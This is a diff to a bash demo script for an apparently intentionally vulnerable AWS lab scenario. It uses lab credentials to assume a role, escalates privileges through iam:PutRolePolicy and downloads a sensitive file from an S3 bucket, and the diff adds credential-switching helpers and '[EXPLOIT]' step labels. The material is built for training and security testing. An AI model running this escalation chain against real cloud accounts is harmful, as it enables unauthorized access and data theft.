@@ -11,6 +11,7 @@ export AWS_PAGER=""
 RED='\033[0;31m'
 GREEN='\033[0;32m'
 YELLOW='\033[1;33m'
+BLUE='\033[0;34m'
 NC='\033[0m' # No Color
 
 # Dim color for command display
@@ -57,23 +58,48 @@ if [ -z "$MODULE_OUTPUT" ]; then
 fi
 
 # Extract credentials and ARNs
-export AWS_ACCESS_KEY_ID=$(echo "$MODULE_OUTPUT" | jq -r '.starting_user_access_key_id')
-export AWS_SECRET_ACCESS_KEY=$(echo "$MODULE_OUTPUT" | jq -r '.starting_user_secret_access_key')
+STARTING_ACCESS_KEY_ID=$(echo "$MODULE_OUTPUT" | jq -r '.starting_user_access_key_id')
+STARTING_SECRET_ACCESS_KEY=$(echo "$MODULE_OUTPUT" | jq -r '.starting_user_secret_access_key')
 STARTING_ROLE_ARN=$(echo "$MODULE_OUTPUT" | jq -r '.starting_role_arn')
 TARGET_ROLE_ARN=$(echo "$MODULE_OUTPUT" | jq -r '.target_role_arn')
 BUCKET_NAME=$(echo "$MODULE_OUTPUT" | jq -r '.bucket_name')
 
-if [ "$AWS_ACCESS_KEY_ID" == "null" ] || [ -z "$AWS_ACCESS_KEY_ID" ]; then
+if [ "$STARTING_ACCESS_KEY_ID" == "null" ] || [ -z "$STARTING_ACCESS_KEY_ID" ]; then
     echo -e "${RED}Error: Could not extract credentials from terraform output${NC}"
     exit 1
 fi
 
+# Extract readonly credentials for observation/polling steps
+READONLY_ACCESS_KEY=$(terraform output -raw prod_readonly_user_access_key_id 2>/dev/null)
+READONLY_SECRET_KEY=$(terraform output -raw prod_readonly_user_secret_access_key 2>/dev/null)
+
+if [ -z "$READONLY_ACCESS_KEY" ] || [ "$READONLY_ACCESS_KEY" == "null" ]; then
+    echo -e "${RED}Error: Could not find readonly credentials in terraform output${NC}"
+    exit 1
+fi
+
+echo "Retrieved access key for: $STARTING_USER"
+echo "Access Key ID: ${STARTING_ACCESS_KEY_ID:0:10}..."
+echo "ReadOnly Key ID: ${READONLY_ACCESS_KEY:0:10}..."
 echo -e "${GREEN}✓ Retrieved credentials for $STARTING_USER${NC}\n"
 
 cd - > /dev/null  # Return to scenario directory
 
-# Step 2: Verify identity as user
+# Credential switching helpers
+use_starting_creds() {
+    export AWS_ACCESS_KEY_ID="$STARTING_ACCESS_KEY_ID"
+    export AWS_SECRET_ACCESS_KEY="$STARTING_SECRET_ACCESS_KEY"
+    unset AWS_SESSION_TOKEN
+}
+use_readonly_creds() {
+    export AWS_ACCESS_KEY_ID="$READONLY_ACCESS_KEY"
+    export AWS_SECRET_ACCESS_KEY="$READONLY_SECRET_KEY"
+    unset AWS_SESSION_TOKEN
+}
+
+# [EXPLOIT] Step 2: Verify identity as user
 echo -e "${YELLOW}Step 2: Verifying identity${NC}"
+use_starting_creds
 show_cmd "Attacker" "aws sts get-caller-identity --query 'Arn' --output text"
 CURRENT_IDENTITY=$(aws sts get-caller-identity --query 'Arn' --output text)
 echo "Current identity: $CURRENT_IDENTITY"
@@ -84,23 +110,24 @@ if [[ ! $CURRENT_IDENTITY == *"$STARTING_USER"* ]]; then
 fi
 echo -e "${GREEN}✓ Verified identity as $STARTING_USER${NC}\n"
 
-# Step 3: Assume the starting role
+# [EXPLOIT] Step 3: Assume the starting role
 echo -e "${YELLOW}Step 3: Assuming starting role${NC}"
 echo "Role ARN: $STARTING_ROLE_ARN"
+use_starting_creds
 
-show_cmd "Attacker" "aws sts assume-role --role-arn \"$STARTING_ROLE_ARN\" --role-session-name \"iam-005-demo-session\""
+show_attack_cmd "Attacker" "aws sts assume-role --role-arn \"$STARTING_ROLE_ARN\" --role-session-name \"iam-005-demo-session\""
 ASSUME_ROLE_OUTPUT=$(aws sts assume-role \
     --role-arn "$STARTING_ROLE_ARN" \
     --role-session-name "iam-005-demo-session")
 
-# Update credentials to use assumed role
+# Update credentials to use assumed role session
 export AWS_ACCESS_KEY_ID=$(echo "$ASSUME_ROLE_OUTPUT" | jq -r '.Credentials.AccessKeyId')
 export AWS_SECRET_ACCESS_KEY=$(echo "$ASSUME_ROLE_OUTPUT" | jq -r '.Credentials.SecretAccessKey')
 export AWS_SESSION_TOKEN=$(echo "$ASSUME_ROLE_OUTPUT" | jq -r '.Credentials.SessionToken')
 
 echo -e "${GREEN}✓ Successfully assumed role $STARTING_ROLE${NC}\n"
 
-# Step 4: Verify we don't have S3 bucket access yet
+# [EXPLOIT] Step 4: Verify we don't have S3 bucket access yet
 echo -e "${YELLOW}Step 4: Verifying we don't have S3 bucket access yet${NC}"
 echo "Attempting to list S3 bucket contents (should fail)..."
 show_cmd "Attacker" "aws s3 ls s3://$BUCKET_NAME/"
@@ -111,7 +138,7 @@ else
 fi
 echo ""
 
-# Step 5: Perform privilege escalation via PutRolePolicy
+# [EXPLOIT] Step 5: Perform privilege escalation via PutRolePolicy
 echo -e "${YELLOW}Step 5: Escalating privileges via iam:PutRolePolicy${NC}"
 echo "Adding inline policy to grant S3 bucket access to self..."
 
@@ -150,7 +177,7 @@ echo -e "${YELLOW}Waiting 15 seconds for policy changes to propagate...${NC}"
 sleep 15
 echo ""
 
-# Step 6: Verify S3 bucket access
+# [EXPLOIT] Step 6: Verify S3 bucket access
 echo -e "${YELLOW}Step 6: Verifying S3 bucket access${NC}"
 echo "Target bucket: $BUCKET_NAME"
 echo "Listing bucket contents..."
@@ -159,7 +186,7 @@ show_attack_cmd "Attacker" "aws s3 ls s3://$BUCKET_NAME/"
 aws s3 ls s3://$BUCKET_NAME/
 echo -e "${GREEN}✓ Successfully listed bucket contents!${NC}\n"
 
-# Step 7: Download sensitive data
+# [EXPLOIT] Step 7: Download sensitive data
 echo -e "${YELLOW}Step 7: Downloading sensitive data${NC}"
 DOWNLOAD_FILE="/tmp/iam-005-sensitive-data.txt"
 show_attack_cmd "Attacker" "aws s3 cp s3://$BUCKET_NAME/sensitive-data.txt $DOWNLOAD_FILE"
